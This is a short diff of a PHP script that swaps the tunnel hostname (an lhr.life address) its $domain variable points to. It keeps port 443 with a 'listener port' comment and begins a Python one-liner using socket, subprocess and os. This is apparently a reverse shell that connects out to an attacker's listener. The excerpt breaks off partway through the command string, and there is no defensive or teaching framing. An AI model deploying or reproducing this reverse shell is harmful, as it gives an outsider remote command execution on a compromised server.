@@ -1,5 +1,5 @@
 <?php
-$domain = '157d3e48113727.lhr.life'; // use the domain name
+$domain = '9392220b30cb20.lhr.life'; // use the domain name
 $port = 443; // must match your listener port
 
 $cmd = "python -c \"import socket,subprocess,os;" .
